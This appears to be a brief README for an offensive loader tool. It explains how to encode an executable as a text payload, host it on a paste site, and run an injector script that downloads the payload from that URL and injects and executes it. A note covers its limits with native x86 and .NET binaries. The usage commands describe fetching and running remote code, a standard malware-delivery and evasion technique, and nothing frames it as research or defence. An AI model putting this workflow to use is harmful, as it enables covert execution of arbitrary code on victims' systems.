![logo](logo.png)

Create a payload:
```
python3 payload.py <input.exe> <output.txt>
```
Upload the payload anywhere that will host a text file. 

Inject and execute the payload:
```
python3 injector.py <https://paste-site.wherever>
```
**Notes:** One limitation of this technique is that it probably only works with executables compiled to native x86 (e.g., by using ```#pragma unmanaged``` when compiling from Visual C++). I doubt it will work with .NET assemblies, but I have not by any means tested this hypothesis extensively, and I'd certainly be interested to hear about any interesting results.  
